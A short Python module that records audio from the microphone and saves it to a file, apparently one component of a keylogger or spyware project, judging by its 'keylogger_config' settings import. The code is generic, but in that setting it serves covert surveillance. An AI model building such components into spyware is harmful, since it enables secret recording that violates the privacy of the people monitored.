import sounddevice as sd
import soundfile as sf

from config.keylogger_config import CHANNELS, DTYPE, DURATION, FREQUENCY, MICROPHONE_FILE_NAME


def get_microphone(output_file_name=MICROPHONE_FILE_NAME, duration=DURATION):
    recording = sd.rec(duration * FREQUENCY, samplerate = FREQUENCY, channels = CHANNELS, dtype = DTYPE)
    sd.wait()
    sf.write(output_file_name, recording, FREQUENCY)

            
if __name__ == '__main__':
    get_microphone()